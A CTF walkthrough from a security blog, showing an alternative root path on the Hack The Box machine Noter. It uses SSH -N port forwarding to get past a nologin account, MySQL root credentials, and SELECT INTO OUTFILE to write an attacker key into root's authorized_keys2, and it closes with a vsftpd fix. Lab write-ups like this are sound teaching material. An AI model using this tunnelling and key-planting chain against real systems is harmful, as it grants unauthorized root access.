---
title: HTB: Noter - Alternative Root (First Blood)
url: https://0xdf.gitlab.io/2022/09/28/htb-noter-alternative-root-first-blood.html
date: 2022-09-28T09:00:00+00:00
tags: ctf, hackthebox, htb-noter, tunnel, mysql, mysql-privileges, mysql-file-write, ssh, vsftpd, vsftpd-local-enable
---

![noter unintended cover](https://0xdfimages.gitlab.io/img/noter-unintended-cover.png)

When jkr got first blood on Noter, he did it using all the same intended pieces for the box, but in a very clever way that allowed getting a root shell as the first shell on the box. I had intended to include that in my original Noter writeup, but completely forgot, so I’m adding it here.

## Noter Paths

The full Noter writeup will be linked in the sidebar of this post, but the quick summary of the steps is as follows:

[![](https://0xdfimages.gitlab.io/img/Noter-Flow.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/Noter-Flow.png)

There’s a good bit condensed into that flow chart, but the part up to getting FTP access as ftp\_admin and leaking the site source are the same. The trick is in how jkr uses the MySQL password with the ftp\_admin password to go right to the root step.

## Alternative Path

### SSH as ftp\_admin

#### SSH Blocked

When I get password for ftp\_admin (“ftp\_admin@Noter!”), I use them to get access to FTP and leak source code. The creds are actually for a system account on Noter, which is what FTP is using to authenticate:

```

oxdf@hacky$ ftp 10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:oxdf): ftp_admin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

I can try to connect over SSH, and it doesn’t work:

```

oxdf@hacky$ ssh ftp_admin@10.10.11.160
ftp_admin@10.10.11.160's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
...[snip]...

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

This account is currently not available.
Connection to 10.10.11.160 closed.

```

On closer inspection, it kind of works. It connects, prints the message of the day, but then it prints “This account is currently not available” and then closes the connection.

#### What’s Blocked

The reason that has to do with how the account’s default shell is configured. With a root shell on the box, I’ll see that the user is in the `/etc/passwd` file, and the shell is configured to `/sbin/nologin`:

```

root@noter:~# cat /etc/passwd | grep ftp_admin
ftp_admin:x:1003:1003::/srv/ftp/ftp_admin:/sbin/nologin

```

This binary prints that message, and exits:

```

root@noter:~# /sbin/nologin 
This account is currently not available.

```

It doesn’t allow for any additional commands to be run. For a typical user account, I might expect to find `/bin/sh` or `/bin/bash` as the default shell.

If I use the root shell to change `/sbin/nologin` to `/bin/bash`, I’m then able to log in as ftp\_admin without issue:

```

oxdf@hacky$ sshpass -p 'ftp_admin@Noter!' ssh ftp_admin@10.10.11.160 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
...[snip]...
ftp_admin@noter:~$ 

```

### Create Tunnel

I’ll abuse this by making use of the `-N` flag in SSH. The [man page](https://linux.die.net/man/1/ssh) shows:

> **-N**’ Do not execute a remote command. This is useful for just forwarding ports (protocol version 2 only).

I’ll want to do exactly that, forward ports.

For details on SSH tunneling, check out my [PWK Notes: Tunneling and Pivoting](/cheatsheets/tunneling) post from 2019.

I’ll use `-N` along with `-L` to create a tunnel from 3306 on my host to 3306 on Noter, allowing me access to a port on Noter that’s only listening on localhost.

When I run this, it just hangs:

```

oxdf@hacky$ sshpass -p 'ftp_admin@Noter!' ssh -N -L 3306:localhost:3306 ftp_admin@10.10.11.160 

```

But `netstat` shows that the `ssh` process on my host is now listening on 3306:

```

oxdf@hacky$ sudo netstat -tnlp | grep 3306
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      9237/ssh            
tcp6       0      0 ::1:3306                :::*                    LISTEN      9237/ssh

```

And I can connect and it works:

```

oxdf@hacky$ mysql -h 127.0.0.1 -u root -pNildogg36
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 771
Server version: 5.5.5-10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

```

### Abuse MySQL

#### Enumeration

The MySQL access is as the root user:

```

mysql> select current_user();
+----------------+
| current_user() |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.08 sec)

```

This user has all privileges on all databases in this MySQL instance:

```

mysql> show grants for root@localhost;
+----------------------------------------------------------------------------------------------------------------------------------------+
| Grants for root@localhost                                                                                                              |
+----------------------------------------------------------------------------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO `root`@`localhost` IDENTIFIED BY PASSWORD '*937440AD99CBB4A102402708AA43B689818489C8' WITH GRANT OPTION |
| GRANT PROXY ON ''@'%' TO 'root'@'localhost' WITH GRANT OPTION                                                                          |
+----------------------------------------------------------------------------------------------------------------------------------------+
2 rows in set (0.09 sec)

```

#### Write File

With all privs comes the privilege to write files. I could solve the intended path this was as well, once getting to MySQL.

I’ll try writing my SSH public key (I like ed25519 keys since they are very short) to root’s `authorized_keys` file:

```

mysql> select "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" into outfile "/root/.ssh/authorized_keys2";
Query OK, 1 row affected (0.09 sec)

```

jkr did something subtle but clever here as well, writing to `authorized_keys2`. This file was once for [different algorithms](https://serverfault.com/questions/116177/whats-the-difference-between-authorized-keys-and-authorized-keys2), but was deprecated in 2001 in favor of just using `authorized_keys`. And yet, it actually still works by default in most (if not all?) scenarios. This makes it a safer place to overwrite without risking stomping the admin’s actual key.
*Update*: Turns out that not only was it safer, but the only was to do this, as the database wouldn’t let them overwrite existing files:

> You remember correctly - this was the reason I picked authorized\_keys2: [pic.twitter.com/6aSb6LTKu1](https://t.co/6aSb6LTKu1)
>
> — jkr (@ATeamJKR) [September 28, 2022](https://twitter.com/ATeamJKR/status/1575137503379587075?ref_src=twsrc%5Etfw)

#### SSH

With that key, I can connect as root and get a shell:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.11.160
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
...[snip]...
root@noter:~# 

```

## Fixing This

The best fix here is to configure FTP such that is isn’t using accounts from the box.

Looking at lines that don’t start with a comment in `/etc/vsftpd.conf`:

```

root@noter:/etc# cat vsftpd.conf | grep -v "^#"
listen=NO
listen_ipv6=YES
anonymous_enable=NO
local_enable=YES
dirmessage_enable=YES
use_localtime=YES
xferlog_enable=YES
connect_from_port_20=YES
chroot_local_user=YES
chroot_list_file=/etc/vsftpd.chroot_list
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
ssl_enable=NO

```

`local_enable` is what allows local users to log in. Disabling that and generating FTP only users would have prevented this attack.

[« HTB: Noter](/2022/09/03/htb-noter.html)